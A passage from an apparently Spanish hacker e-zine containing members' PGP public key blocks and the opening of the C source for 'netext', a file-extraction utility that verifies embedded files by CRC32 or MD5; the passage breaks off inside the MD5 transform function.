wrebAkJcYl2kcuKEP7Lu8QR5zkkCM4tPZO4xch8VxG/og17M9BsfvDk7drgO5MJy
klDbmRaFD5D+uzzKF/iz0afOXoGyfZnrRiKdabXBWjZ73wkwz+ev/1Vp+TOF+FTe
xcqGA/9DRKV+nbf2xb4QCvSnRQl4j/o7YyILNsSj7mU9xPBTjZLVSZ10foJyowfN
w+W3AyX0XSoS+wi25fPhBRKhIK1LQlxSV8Pm68/41z/aLRxcdpFatCQH0JgZQmwV
yoYREF9YfYSGMC3tTLcxpiHO5XzRM9DTMjRRj9v/wpb60dPMKbQeVWxhbmRyb24g
PHVsYW5kcm9uQHBzeW5ldC5uZXQ+iFcEExECABcFAjacgekDCwQDBRUDAgYBAxYC
AQIXgAAKCRA90kg8z0K2P9onAJ9Dj4VI8gjqZH/tUgWeULWdGAT1RgCfaYPTly0y
zy3ljOifL+1OkKcppeW5AQ0ENpyCAxAEAMofW7DR0WLQkizDm29RDq5EiCysnJ93
NEuFVoC/y0LFFBZ2JcN77O+cTrljMDk5TQUNAB7L8mlXlXPgH1Ne/j38jBkFublF
B/r7vr3OOa3KGX1pCWSkCiw3rNCMpvkO6PSjPg4ijA1agixfoddo0VeroBQu57KR
D7Ygl2kGpcvfAAMHBACbpXAI6qnF0BWw6MWNe1QXczpeiESRqPZvLEYz//u/BptQ
3wf8FKdQaiwaLhEZAiosCux47Qnx3zU/NGL/ujIdbciVOzQMubVM8U8Ao0ACDEnt
i1meqLNcenvJM/J+FN6HRp0R+EW3Chxb8Fz1+myugfHOxMw7aFh90m7avHnmXIhG
BBgRAgAGBQI2nIIDAAoJED3SSDzPQrY/6sYAnjA7aEJJDM5iXX8eLbX5wvoft0Gu
AKCeRZisFpJqDQHQlEwumEphVIgp0g==
=h0Tu
-----END PGP PUBLIC KEY BLOCK-----
<-->

- Llave PGP de cafo
<++> pgpkeys/cafo.asc $21ecdeaa4565ec0ad77b273084a0d30d
-----BEGIN PGP PUBLIC KEY BLOCK----- 
Version: PGPfreeware 6.0.2i 
 
mQGiBDc3q2ARBADSGG687E2RnRG0tXVBmPt32Ys4W/6bXnr66asKWnPEGWcoBs5y 
zZgbVnGLYEr/sPGwxljjLeAGjICGeHlPWSlv0x1l+94ibjSf+Csuxb0OAb7Acyum 
10ZhS1lz30l2kxzBJmXBtQIqhUxOjhGXG3FMDrJv1fSj/2jbpGHuTKIFdQCg/9nr 
ckGNmrFoLO3/74pnEqJ824cEAIPFIxZMPWFFYt7zxBGejXZ5O+9KaUs4V7Hba2Bi 
OStdHmxHOY44VKTgE2Gy9XX/qHB3fQCJmRVn49IYDJdfIBHgmmcWhguBntvaTR2t 
YXcGbtRsv7pcN8r8HnEFCof29Q3U4mwTBU3bTSkDMqRBXYgBMKlfxGZNqqYQYWmX 
0edWA/0TxSuQdpHiXv0d/VhfMKBSji5wVRxaig5lcRR7Qynl6BbV5DGh/Sv34L4r 
ywDnxhASVeH8dk4HGSCIZ7l9rRMJ2WfRCFWZC2ESUETDxcKp2HZ9TA5pRXW/mIBK 
4cOQdBR9Xsd5Rkt3Mouixs2oIpuAIntpinY7sVyXlCrkPEvztrQcY2FmbyA8ZW5j 
bWVzaWFoQGJpZ2Zvb3QuY29tPokASwQQEQIACwUCNzerYAQLAwECAAoJEOsx4hfo 
lABcSUIAnRigizGFd1ZNAxDmyU0P1+HmqJJ8AKCuUBhEgzMNINAQFdMK9fAeQ71B 
KLkEDQQ3OBohEA/9G7bosMjxPJmhSEJPnosTs48YdUP1Z3N6ZQrJ1N6uY9G+rExx 
XwV9URMwctNPGm0CbaJojdnaMEEI8S04N5xDx5Bb5AjeSSJHod0M/STalPou7CAR 
UX4aKK/XEUfpDeMw2liGbwLY/xbm3b6c6xu/Q+LGshYAiqv8pydUm0vPLdFjXgvR 
Q1JrhGEp2i6Tch7RNQf+TL0j7i2I25kSW7AUSTQpfG1QDlbnkFMJfMJ6vN1UR17J 
bv7ipyFWgTzZ90b5s9RreVwajnkWNq5c1WjTYZkCV+xOES9Ja9f/U4d1yJKEhIJm 
zNN0+miF+HG7VuNnKRASBRq8fR56jnr2YCY2T0bIekk2SH43mLt+2cYjX9RAcIzk 
EO4BRhtXfY/0w2aOpITQfuUhrOg8NGHVHj0uFtHnka4UGKUGNWDY9mpNFtrE86JJ 
bfMjB84TX/I4T58hcg7cnjYKDTVeE80lK2HXEYSBGBWtrjul13n0detjO9LFLd/e 
3D0V6Zhs3VAEEsy+d2KxE6XGV9XbvuzAV59uXGaBD5y1uz8UyQg53gr5FU7FAmEf 
zohS+8VdeIik0Mno6SwTaKBYTuMnPFZVQJjAN91VcMiF1c+cBmFoIePAOypdp7pj 
3bVb9u9qTa3UJ7VZ1VXVI00D/YS7mha/hfGLUalBcgsc0JYNJCf3ubMg7OsAAgIP 
/Aw8lA4/vXQHVwGfYIUWqsCDBABlFKMPH7GXmjVJhIJyER88QIQ+M1wuBIT8Kyme 
cmn3dakpJuK1v1+Eafux8iZZ4xyC5qUYAKP0jYLBFAWY7QxIZle9IBnmrfCakB+d 
eiGWczPLl82BBUmL+Tw/x5NKVyoPpTPZcXi4sDbDi3bVvv9EpYaXLpV7PITKNXNn 
bOPn4s+unfhUPVEY7NpRh0O5exqsAMFFeYA8yZ9gSXYj6ZpPZobdcR7QpH1yaodn 
Jztzp121IQ9UTxI+mHN3tLfMZ9oH94tMpcFRXmHlN6zVRxdLuO9YRdfjsomkQRpF 
NH9VrgeZ7G9qmN56lJmjw9GvGtOCJ0l0lZASnhGeU9Dw5WDDcNFTb60pu69yRQF7 
msMvZ+5gWxMdiB8R2cpLCLWn4XhEgz0S4ijkFuyNMZuTNRjkKVsiJqlE0RtA779c 
4jDtfsKxQzLABYwPXO6Hsp3uKG4JMfDZuuYFPuPrVgTzMFD/z9HTHRggsVCjT5W+ 
qWcKvIS3Vd57VfvHIhAqrAdg0p4xB+VslcOfxL3Mr6dnixB8t33Iq9QjZc8Df3lO 
n0Kveooh7ggNJ1+ollQyiWsrCKiP6eAN35Ltg355qm7Pt3aFp0PWOvDFvjm3wUGJ 
FxstKLrS91vW52J4m4YkkmqLZSRSyjEhVryFxY/JFJE7iQA/AwUYNzgaIesx4hfo 
lABcEQIiXgCgglEoBgaUJaqU52rQu8vWTSu+e4YAnRA0k9VD46fd1qmAc/QG6QDt 
r9Vo 
=en2Z 
-----END PGP PUBLIC KEY BLOCK-----
<-->

- Llave PGP de Aule

 *** Llave PGP no disponible ***

- Llave PGP de Freed0m
<++> pgpkeys/freed0m.asc $16b1abdafcedc478903d9d956046ee9f
-----BEGIN PGP PUBLIC KEY BLOCK----- 
Version: PGPfreeware 5.5.3i for non-commercial use <http://www.pgpi.com> 
 
mQGiBDbZZSMRBADMfeY/yk9LSYra+yXMDVdCUEYCcsaFcELWsc/EVpmtN/3EmY+a 
uDETnqzQt+c+vAxYGSA1lOvUsyCDpN/75DSKGVqT51GPCFI5qNFLoHabwhNRHB/s 
8Y8/6iZW+5eg8FggtvYQmNycRalo0Za2wiFmBMVm4C/run08mAwrBWcK7QCg/7g5 
B4JtZzG/E9Nbw+5UOCsW2k8EAICljGE24BI0jyFxVUyX6R1CQJ6wVTtgeN4SHDXb 
VnbQ152eSP6lcnuzeKAba3aIRUc6ircu8uR/8nM29p1vY9djercFUb0GZlBE9S/t 
HdrOF5ZazGkpDb8bOemmeSKA8vfcBBKhlAB+sOqxEhTBIyioCTZQPtXFNrtx+Nsg 
vPf4BACavJOfR5JAKcQLh13R/20H4KQIkmFFWITimFn7sgkowhePCANHp8PhdIsa 
fUF3Cq0U+nBfYuLC0N15SEpWa2wned4D9045mHb9vuAihlBE0ZwojgZItWqhNHOE 
QS8y7AdOQgdRNr0E4SnFLv1EdHFT3xMU1VjRbZLc4QMQgflqALQcRlJFRURPTSA8 
ZnJlZWRvbUBob3Rwb3AuY29tPokASwQQEQIACwUCNtllIwQLAwIBAAoJEEGSLtsW 
ep4KLIAAmwRSG4zHPQeVBVEgqcDPKVFipvVtAJ494S5d9mm5qjhp9qpocPPqz2Ht 
gLkEDQQ22WUlEBAA+RigfloGYXpDkJXcBWyHhuxh7M1FHw7Y4KN5xsncegus5D/j 
RpS2MEpT13wCFkiAtRXlKZmpnwd00//jocWWIE6YZbjYDe4QXau2FxxR2FDKIldD 
Kb6V6FYrOHhcC9v4TE3V46pGzPvOF+gqnRRh44SpT9GDhKh5tu+Pp0NGCMbMHXdX 
JDhK4sTw6I4TZ5dOkhNh9tvrJQ4X/faY98h8ebByHTh1+/bBc8SDESYrQ2DD4+jW 
Cv2hKCYLrqmus2UPogBTAaB81qujEh76DyrOH3SET8rzF/OkQOnX0ne2Qi0CNsEm 
y2henXyYCQqNfi3t5F159dSST5sYjvwqp0t8MvZCV7cIfwgXcqK61qlC8wXo+VMR 
OU+28W65Szgg2gGnVqMU6Y9AVfPQB8bLQ6mUrfdMZIZJ+AyDvWXpF9Sh01D49Vlf 
3HZSTz09jdvOmeFXklnN/biudE/F/Ha8g8VHMGHOfMlm/xX5u/2RXscBqtNbno2g 
pXI61Brwv0YAWCvl9Ij9WE5J280gtJ3kkQc2azNsOA1FHQ98iLMcfFstjvbzySPA 
Q/ClWxiNjrtVjLhdONM0/XwXV0OjHRhs3jMhLLUq/zzhsSlAGBGNfISnCnLWhsQD 
GcgHKXrKlQzZlp+r0ApQmwJG0wg9ZqRdQZ+cfL2JSyIZJrqrol7DVes91hcAAgIP 
/RnhFzz6vFg3+6jnmzY8nodsaMzD8LHqyuC0mf0Q4Lu1c4LEE7MsvmLug4upKbS6 
xIbaAKxTZ8QFbYwEA92rfmM5Bw9REso5Kpc75NaFpf63eEGFFIPJinS+Qu0/3+vy 
I5YSQ+N1eaQ5NCXZ8ZpTa6AsmFgES3qGzy5/hADn7QK2mfdu2eAkcKteuKVEDvPO 
8I4CM2FSX1rYFLX4y0qclSbgHe3gDrrmqbwhkXOVvlvZqwAj/cZZicIIRz05dE8X 
G5Jf4DQi2YSlHJSs+AAIwIRoPUoUG9vD/33ZjeqONgkALzz4ifGYsi9rU/zQ/Sho 
j0OgyFLSA3ytctQvKZc3P3/Err/xyKgOQ7VDX5huJ7bbg4k5FJJ0dMQbinVzAnT9 
55uVrcPpR4XRsKLnTTy+Ych+Lq0ykkbPYM0g9FEtVsIdVgsqwN70NVu/qQXegDsu 
kfhwATh5Qp+rDf5pQINZ4EnzxFVLyBx5n75abei9ihqpnNp1cgElzTIOPG06uM7z 
kXralUzOxvEBFjy/BrLRYLow6O8KHMLu2YPY7OdlskkG9Vi9SceOi18HYrux+o/h 
ZE6ik4IkdGKF6fFiLoHKdGRezYBYyyh9k5RklxCeNsh1c/LK/Pd1ifUboSlkD5BM 
Cj4T0un/Tt0u8pOeamxoJSdu9JTQso5hzrVzk13RwUw7iQBGBBgRAgAGBQI22WUl 
AAoJEEGSLtsWep4KpZUAoIaFhg/YVWph6E7ZAQzslzOYe8Z8AJ9SV0LuVQXxlAlq 
xvXjhzDmKFYw+g== 
=2ffT 
-----END PGP PUBLIC KEY BLOCK-----
<-->

- Llave PGP de GamerX
<++> pgpkeys/GamerX.asc $9a48b947083b31861cd7e4bf7b6f4872
-----BEGIN PGP PUBLIC KEY BLOCK----- 
Version: PGPfreeware 6.0.2i 
 
mQGiBDdsJewRBADgc/cAGAhR1GUJp7XWNYgthgNjSBTZRaultDJ3COUw0X21K+iO 
VBGeMf5jyq6aBv5KM8vAwItaLzlCDLM7FXPrep/hZzFi0w8M91VS/Vqqgn6FTfKV 
zHjKaER5zkSczIRaKzPXOJfkj0l+8ApPGyelcw8TKiedQe4gJM6OG4yrnwCg/6Rb 
TAjqurbxwk1JJBfU2QDRYRMEAKMFZM/pI04ezJc9WgVJxNg6C+XBtPQotCb6Vj6B 
gAkBcaRE9RVuOXnVh3dorvKlFA+A5YAPvxp37lBocUl4KghNt1EDj43BTdWTCDKy 
0VndJczS7LOgjFjjZ02knk1tBI9X3mwLf4++n5WNEz0QFJUZz5uLzizNV9zFDaE7 
ZCvHBACvlEJqy03h3/ol7RAlfsfd9+EkBbcEOmLlBLjXAP0tsKiHQ2ikhSgLOQud 
7GA7P5xQOvBeS2tLoLDUm2c3hQVaO72y80wSB5WBNnus0iWexmrbIv5bzmEXpw5R 
X+nFWutN5AE5ro3/6X6DymRbWejcr29uM0mYA3kTlMzkONZYqbQcR2FtZXJYIDxn 
YW1lcjMyQG1peG1haWwuY29tPokASwQQEQIACwUCN2wl7AQLAwIBAAoJEJqt9eim 
1Ww9p3cAoL69sEjbabpYk4bwwD/b+kA25umrAKDzSmMVLLiJI+HIoftSHn5bf/Lg 
WLkCDQQ3bCXsEAgA9kJXtwh/CBdyorrWqULzBej5UxE5T7bxbrlLOCDaAadWoxTp 
j0BV89AHxstDqZSt90xkhkn4DIO9ZekX1KHTUPj1WV/cdlJPPT2N286Z4VeSWc39 
uK50T8X8dryDxUcwYc58yWb/Ffm7/ZFexwGq01uejaClcjrUGvC/RgBYK+X0iP1Y 
TknbzSC0neSRBzZrM2w4DUUdD3yIsxx8Wy2O9vPJI8BD8KVbGI2Ou1WMuF040zT9 
fBdXQ6MdGGzeMyEstSr/POGxKUAYEY18hKcKctaGxAMZyAcpesqVDNmWn6vQClCb 
AkbTCD1mpF1Bn5x8vYlLIhkmuquiXsNV6TILOwACAggAsfRxK+/3XGMbnm7+nzyu 
hHr8nHhkjUJayDkP38qyDv0oR74O4vX2gL33VK1I+NgeWqw9o2Z7GKsjwKt1xgR+ 
dSmHrGvB1+7NDDu1bf2xDFHFjhl44Sm2VTL9Cdq2GJQtTMjOm/5Y/wCK+le7E7Vz 
+nVQZy0jV0U+U9g7611BUjWOUBnka55mfaruUAsV2jYmORbhy2U3oP7BVmNvnpxo 
CVen8ZoeqHGnfw5A8tR6VXiqiC8g5ADlivFj27PjT0qGmaNxsJWXu0e8G1p4C49T 
GUd/0TxuO+ytrapt0UoeucHudk1BicQKkSGS/QwKhe/JMswkpS2g1rOmpdYc2XeC 
DokARgQYEQIABgUCN2wl7AAKCRCarfXoptVsPWYqAKCjVEqsG+hs5ARLQbTUyW63 
lmiWpgCg17pTuCorEbihN4IZ7YlDFnJiJKQ= 
=4GDz 
-----END PGP PUBLIC KEY BLOCK-----
<-->

- Llave PGP de p0th
<++> pgpkeys/p0th.asc $da6e9b8eeb83e518b0d423ebc5edc6b6
-----BEGIN PGP PUBLIC KEY BLOCK----- 
Version: PGPfreeware 6.0 for non-commercial use <http://www.pgp.com> 
 
mQGiBDaPW5cRBAD9Oo0FPxkffMr82Rksj+IL+1kNNuKtyUCW6SwI5deulzQ3SFj5 
nCwLITY4AsOwC50jpcL9YRtSfytZqxTz0KkwtQqKcpXito/U5/QUTzsrZQXWSh44 
j+6gmd2jLa1POmVcRzhBjKdJ+4FAre5tMDmzFGzjUIoerPH/q91Q3iulqwCg/4Ka 
gF9ocjNHZqnWOkordBbrIasEAJ8p6iypfVYxikC0DKwY651omYUChEdH34g8XxSp 
Ss8Wu+XYLN6xxz2PA8XN5uVbeXfZt+giGZ9grMwKMOqEjb4UCkbR3UMnE0LroKDP 
aNw0M/PQ3kXJXPnL10gP7dqAJM25D2E0dZdkFPfUb//Wzab8ovA1RE1cZUW7wglB 
pkSOA/4gJN93QqA76dU/pQxKllVbA/CgWRFfJ74lzjoFjwlzxphafe12dxKTqCsw 
mEdcNdqIkqAd98WZrjLNJx3hZ57BQW5iyf7Lz5gd1r8orqtmQOY2Gnu8XkWtabRA 
0XbUBt8NdAZLcJrKUPIgO+iVvU5bgw+zyBk7H/yWRTThVawDlrQWcDB0aCA8cDB0 
aEBob3Rwb3AuY29tPokASwQQEQIACwUCNo9blwQLAwIBAAoJEAYagG10cRU1YN8A 
n3AzRF1RzWT+9dLjP4OgqJ6rmzORAKDPkPPf/LPJc+0NLAezBZLkEqSgirkBDQQ2 
j1ukEAQAxPFPJk4At6G08NKzj7ixeEnWVnBFiHPXStp5ywvUihASX+ZwMkaSxCkg 
Q32rzVd96hSUCMfEDNb0PMJkYksk6amuAQsw3EuAUZYO/jCjAACSxlNLn9kphNbD 
prqIVRN/EQgMicCw1/eAnFbrn9xGZNBV+I3iAKihLwXf+Wd/NykAAgID/RksfCcl 
clW9Y/xJju3tcWr3MJ5FsRd6pMSy32D4bORq3yT/ZpwZLWE0mROos9NcQMXZMUAW 
UBqukutPpMiIUUcnQfJVAjdtWImpZoiwYlkQ+MwLsnVmLn6XZARi7ZlTG9Cy+gkU 
LR/VxHkdlijXmAmrv6WYH+wduagXj8Ad0KQDiQBGBBgRAgAGBQI2j1ukAAoJEAYa 
gG10cRU1uewAoMGV0MSO+hMpad7S15mZ7HxLekPAAKCdzmjPX+CXorF3tQ5k9HVu 
mwLdbA== 
=+pgy 
-----END PGP PUBLIC KEY BLOCK-----
<-->

- Llave PGP de IReick

 *** Llave PGP no disponible ***

- Llave PGP de DarK FeaR
<++> pgpkeys/DarK_FeaR.asc $fecd8ddd75f6ddbecb0ee1e588b757e4
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v1.0.0 (GNU/Linux)
Comment: For info see http://www.gnupg.org

mQGiBDfksEQRBACElULZeSRVS0vQ2jA3QfHyj/r3BcrLJg5wkeSJBHm3UleIxF8A
zVdWp8J8C9wESLFj5xX8560UW1MJ9a300PClpm+kEEzpfIPUssxPpkgn+e4KAZov
KkwWclyUyZOJbic+dHm7H1StdSEWjdT/PMQRUqZZK99e99sb2C0oVTLwUwCg4+08
V96vr/ymO1Gse74g7S0z7EsD/0NXTdhLbLLncPivR7s2DYnN/gi32u93yPJeGQbC
5eyCQoD34/Yj9Q7+bK0dSmR+6RuZ0r/EgPkqmI98KVwUWQva168O/dE/mqXmPo3A
pcZS4gvNbpwNc6C1PesYSvYfWxJ+U44MGFYEPib6NniqOuk1Ri10oFnvFB3f7a5Q
X5H1A/wOTKmwN9cH2gClH5a1a17938h4JNPGTEw5Ht0qdAxjDwLIeThPyFj6eEZr
FO7DYK4MRrOYpYBVI9oULSL8/DFDLce1fRVXN3IxOgPsd9hJUWEaaOX9kB7u9WDB
cwAtV07GLkkDKr6qZ0tf64bJFYzo7IxkO3TMaOyASINMKOqdHLQfRGFySyBGZWFS
IDxkYXJrZmVhckBob3Rwb3AuY29tPohVBBMRAgAVBQI35LBEAwsKAwMVAwIDFgIB
AheAAAoJEFglwLtQhjeJUWAAn0qkZnisNEMYtGg5ZVUyBhmPBd8aAJ4vIatD0UHV
IslSgXOH2ZeZbKXPvLkCDQQ35LBhEAgA2i92DzTwH8896nml582XZiAWW3VmDUNl
lvSz1VPmTpRYiSIQ/m8G4pO5Vv2T3B95KFDIcl0CWoUL+fzWSGiqmM3xIXKNbwFd
gMtr+c/L2vMKKSNno4+DropPSGE6MISgMUUnmOocme8SeqXmiU308YEVYqz1ukT/
Lab41JIYMhCJ041UNKIBapbX38Liyt32VNtam0VqWDpLOKoyevFusO0dMlCk1uzp
WSCG0C+faI+xwOL/5HymYkVpCukdUrGgnLcittFF23nFLWtfrPrP/j2yS7CTEUTK
urklqdvzBaH8SOt+nJvHeAXi3MqLIr/jupzWCdw6NzQf4kb3+nrhFwADBQf/ROEW
6yJWf1TyveO8deYjiyqbvXumJtSa74jsGXz6+dDQcX538vZY1SwdvapmlIZPdd1b
p9zKsGg9nB7VklbOc90hEiUBGgYl39K/9EkQI23STZS7hZQGosncDlbMg0Q5RrUy
eX1H4KENri7tFbRZPb/kOjynPiotO4tlVYq7rJxeOUuKeersWohulDYl+1FYU+7f
LHvZKhJY35S+ukQ8Be/FPlQfJbzt6JiriDYhOIiUlmGHojvrL89DDl1dDGSfioaA
PKPq89F7V9tWVdS/pZJhJBMF6X/xo/epKECSEM4Q4H6b8AVNlRtE6NsAV+3KWsac
51PL56rOHStWKeHfsohGBBgRAgAGBQI35LBhAAoJEFglwLtQhjeJMQ4An2u904rU
hW61OrZ3MLpaT1UqClGEAJsGIHckl+wJt3XwDyRo7DntjzRtgA==
=2aQS
-----END PGP PUBLIC KEY BLOCK-----
<-->


=[01100b]=====================================================================
=[Fuentes del NetExt]=========================================================
=[por cafo]===================================================================

     Otro numero, otra novedad. En este caso cafo se ha puesto a currar de
nuevo (hay que ver que ganas le pone :) y ha salido la nueva version del
netext. Esta nueva version, ademas de la tipica funcion de extraer y de la
comprobacion del crc32 que se le añadio en el numero pasado, chequea el md5
del archivo. Se conoce que el cafo llego a sudar sangre para conseguirlo :),
pero ya esta, lo tenemos aqui como diria uno que yo me se 'pa todoh ustedeh'.
A partir de ahora, si os da por escribir un articulo para el e-zine, en las
etiquetas de extraccion podeis usar el formato antiguo del crc32 o el del
md5, eso lo dejamos a vuestra eleccion. Venga, disfrutadlo.

[N. del E.: Las fuentes del programa que nos da el crc32 de un archivo las
 podreis encontrar en el numero aterior del e-zine]

/*  net_md5.c   by (un monton de gente) + cafo
 *
 *  Esta es una version mejorada del programa extract.c de phrack(r).
 *  Aparte de hacer comprobaciones crc32, esta vez le he a~adido la
 *  posibilidad de hacer comprobaciones basadas en MD5.
 *
 *  Para sacar el numero MD5 de un archivo solo con este programa, crear
 *  un archivo con las etiquetas apropiadas pero el numero MD5 falso:
 *  el programa automaticamente mostrara cual es el correcto (la marca de
 *  comprobacion de MD5 es '$').
 *
 *  Agradecimientos al equipo de Ron Rivest que hicieron todo este codigo de
 *  libre distribucion :)
 *
 *  gcc -o netext net_md5.c
 *
 *  ./netext file1 file2 file3 ...
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
#include <dirent.h>

#define BEGIN_TAG   "<++> "            
#define END_TAG     "<-->"             
#define BT_SIZE     strlen(BEGIN_TAG)
#define ET_SIZE     strlen(END_TAG)

struct f_name
{
    u_char name[256];
    struct f_name *next;
};
		
#ifdef __alpha
typedef unsigned int uint32;
#else
typedef unsigned long uint32;
#endif

struct MD5Context
{
   uint32 buf[4];
   uint32 bits[2];
   unsigned char in[64];
};

void MD5Init(struct MD5Context *context);
void MD5Update(struct MD5Context *context, unsigned char const *buf,
               unsigned len);
void MD5Final(unsigned char digest[16], struct MD5Context *context);
void MD5Transform(uint32 buf[4], uint32 const in[16]);

typedef struct MD5Context MD5_CTX;

#ifndef HIGHFIRST
#define byteReverse(buf, len)	
#else
void byteReverse(unsigned char *buf, unsigned longs);

#ifndef ASM_MD5
void byteReverse(unsigned char *buf, unsigned longs)
{
    uint32 t;
    do {
	t = (uint32) ((unsigned) buf[3] << 8 | buf[2]) << 16 |
	    ((unsigned) buf[1] << 8 | buf[0]);
	*(uint32 *) buf = t;
	buf += 4;
    } while (--longs);
}
#endif
#endif

void MD5Init(struct MD5Context *ctx)
{
    ctx->buf[0] = 0x67452301;
    ctx->buf[1] = 0xefcdab89;
    ctx->buf[2] = 0x98badcfe;
    ctx->buf[3] = 0x10325476;

    ctx->bits[0] = 0;
    ctx->bits[1] = 0;
}

void MD5Update(struct MD5Context *ctx, unsigned char const *buf, unsigned len)
{
    uint32 t;

    t = ctx->bits[0];
    if ((ctx->bits[0] = t + ((uint32) len << 3)) < t)
	ctx->bits[1]++;		
    ctx->bits[1] += len >> 29;

    t = (t >> 3) & 0x3f;	


    if (t) {
	unsigned char *p = (unsigned char *) ctx->in + t;

	t = 64 - t;
	if (len < t) {
	    memcpy(p, buf, len);
	    return;
	}
	memcpy(p, buf, t);
	byteReverse(ctx->in, 16);
	MD5Transform(ctx->buf, (uint32 *) ctx->in);
	buf += t;
	len -= t;
    }

    while (len >= 64) {
	memcpy(ctx->in, buf, 64);
	byteReverse(ctx->in, 16);
	MD5Transform(ctx->buf, (uint32 *) ctx->in);
	buf += 64;
	len -= 64;
    }

    memcpy(ctx->in, buf, len);
}

void MD5Final(unsigned char digest[16], struct MD5Context *ctx)
{
    unsigned count;
    unsigned char *p;

    count = (ctx->bits[0] >> 3) & 0x3F;

    p = ctx->in + count;
    *p++ = 0x80;

    count = 64 - 1 - count;

    if (count < 8) {

	memset(p, 0, count);
	byteReverse(ctx->in, 16);
	MD5Transform(ctx->buf, (uint32 *) ctx->in);

	memset(ctx->in, 0, 56);
    } else {
	memset(p, 0, count - 8);
    }
    byteReverse(ctx->in, 14);

    ((uint32 *) ctx->in)[14] = ctx->bits[0];
    ((uint32 *) ctx->in)[15] = ctx->bits[1];

    MD5Transform(ctx->buf, (uint32 *) ctx->in);
    byteReverse((unsigned char *) ctx->buf, 4);
    memcpy(digest, ctx->buf, 16);
    memset(ctx, 0, sizeof(ctx));      
}

#ifndef ASM_MD5

#define F1(x, y, z) (z ^ (x & (y ^ z)))
#define F2(x, y, z) F1(z, x, y)
#define F3(x, y, z) (x ^ y ^ z)
#define F4(x, y, z) (y ^ (x | ~z))

#define MD5STEP(f, w, x, y, z, data, s) \
	( w += f(x, y, z) + data,  w = w<<s | w>>(32-s),  w += x )

void MD5Transform(uint32 buffer[4], uint32 const in[16])
{
    register uint32 a, b, c, d;

    a = buffer[0];
    b = buffer[1];
    c = buffer[2];
    d = buffer[3];

    MD5STEP(F1, a, b, c, d, in[0] + 0xd76aa478, 7);
    MD5STEP(F1, d, a, b, c, in[1] + 0xe8c7b756, 12);
    MD5STEP(F1, c, d, a, b, in[2] + 0x242070db, 17);
    MD5STEP(F1, b, c, d, a, in[3] + 0xc1bdceee, 22);
    MD5STEP(F1, a, b, c, d, in[4] + 0xf57c0faf, 7);
    MD5STEP(F1, d, a, b, c, in[5] + 0x4787c62a, 12);
    MD5STEP(F1, c, d, a, b, in[6] + 0xa8304613, 17);
    MD5STEP(F1, b, c, d, a, in[7] + 0xfd469501, 22);
    MD5STEP(F1, a, b, c, d, in[8] + 0x698098d8, 7);
    MD5STEP(F1, d, a, b, c, in[9] + 0x8b44f7af, 12);
    MD5STEP(F1, c, d, a, b, in[10] + 0xffff5bb1, 17);
    MD5STEP(F1, b, c, d, a, in[11] + 0x895cd7be, 22);
    MD5STEP(F1, a, b, c, d, in[12] + 0x6b901122, 7);
    MD5STEP(F1, d, a, b, c, in[13] + 0xfd987193, 12);
    MD5STEP(F1, c, d, a, b, in[14] + 0xa679438e, 17);
    MD5STEP(F1, b, c, d, a, in[15] + 0x49b40821, 22);

    MD5STEP(F2, a, b, c, d, in[1] + 0xf61e2562, 5);
    MD5STEP(F2, d, a, b, c, in[6] + 0xc040b340, 9);
    MD5STEP(F2, c, d, a, b, in[11] + 0x265e5a51, 14);
    MD5STEP(F2, b, c, d, a, in[0] + 0xe9b6c7aa, 20);
    MD5STEP(F2, a, b, c, d, in[5] + 0xd62f105d, 5);
    MD5STEP(F2, d, a, b, c, in[10] + 0x02441453, 9);
    MD5STEP(F2, c, d, a, b, in[15] + 0xd8a1e681, 14);
    MD5STEP(F2, b, c, d, a, in[4] + 0xe7d3fbc8, 20);
    MD5STEP(F2, a, b, c, d, in[9] + 0x21e1cde6, 5);
    MD5STEP(F2, d, a, b, c, in[14] + 0xc33707d6, 9);
    MD5STEP(F2, c, d, a, b, in[3] + 0xf4d50d87, 14);
    MD5STEP(F2, b, c, d, a, in[8] + 0x455a14ed, 20);
    MD5STEP(F2, a, b, c, d, in[13] + 0xa9e3e905, 5);
    MD5STEP(F2, d, a, b, c, in[2] + 0xfcefa3f8, 9);
    MD5STEP(F2, c, d, a, b, in[7] + 0x676f02d9, 14);
    MD5STEP(F2, b, c, d, a, in[12] + 0x8d2a4c8a, 20);

    MD5STEP(F3, a, b, c, d, in[5] + 0xfffa3942, 4);
    MD5STEP(F3, d, a, b, c, in[8] + 0x8771f681, 11);
    MD5STEP(F3, c, d, a, b, in[11] + 0x6d9d6122, 16);
    MD5STEP(F3, b, c, d, a, in[14] + 0xfde5380c, 23);
    MD5STEP(F3, a, b, c, d, in[1] + 0xa4beea44, 4);
    MD5STEP(F3, d, a, b, c, in[4] + 0x4bdecfa9, 11);
    MD5STEP(F3, c, d, a, b, in[7] + 0xf6bb4b60, 16);
    MD5STEP(F3, b, c, d, a, in[10] + 0xbebfbc70, 23);
    MD5STEP(F3, a, b, c, d, in[13] + 0x289b7ec6, 4);
    MD5STEP(F3, d, a, b, c, in[0] + 0xeaa127fa, 11);
    MD5STEP(F3, c, d, a, b, in[3] + 0xd4ef3085, 16);
    MD5STEP(F3, b, c, d, a, in[6] + 0x04881d05, 23);
    MD5STEP(F3, a, b, c, d, in[9] + 0xd9d4d039, 4);
    MD5STEP(F3, d, a, b, c, in[12] + 0xe6db99e5, 11);
    MD5STEP(F3, c, d, a, b, in[15] + 0x1fa27cf8, 16);
    MD5STEP(F3, b, c, d, a, in[2] + 0xc4ac5665, 23);

    MD5STEP(F4, a, b, c, d, in[0] + 0xf4292244, 6);
    MD5STEP(F4, d, a, b, c, in[7] + 0x432aff97, 10);
    MD5STEP(F4, c, d, a, b, in[14] + 0xab9423a7, 15);
    MD5STEP(F4, b, c, d, a, in[5] + 0xfc93a039, 21);
    MD5STEP(F4, a, b, c, d, in[12] + 0x655b59c3, 6);
    MD5STEP(F4, d, a, b, c, in[3] + 0x8f0ccc92, 10);
    MD5STEP(F4, c, d, a, b, in[10] + 0xffeff47d, 15);
    MD5STEP(F4, b, c, d, a, in[1] + 0x85845dd1, 21);
    MD5STEP(F4, a, b, c, d, in[8] + 0x6fa87e4f, 6);
    MD5STEP(F4, d, a, b, c, in[15] + 0xfe2ce6e0, 10);
    MD5STEP(F4, c, d, a, b, in[6] + 0xa3014314, 15);
    MD5STEP(F4, b, c, d, a, in[13] + 0x4e0811a1, 21);
    MD5STEP(F4, a, b, c, d, in[4] + 0xf7537e82, 6);
    MD5STEP(F4, d, a, b, c, in[11] + 0xbd3af235, 10);
    MD5STEP(F4, c, d, a, b, in[2] + 0x2ad7d2bb, 15);
    MD5STEP(F4, b, c, d, a, in[9] + 0xeb86d391, 21);

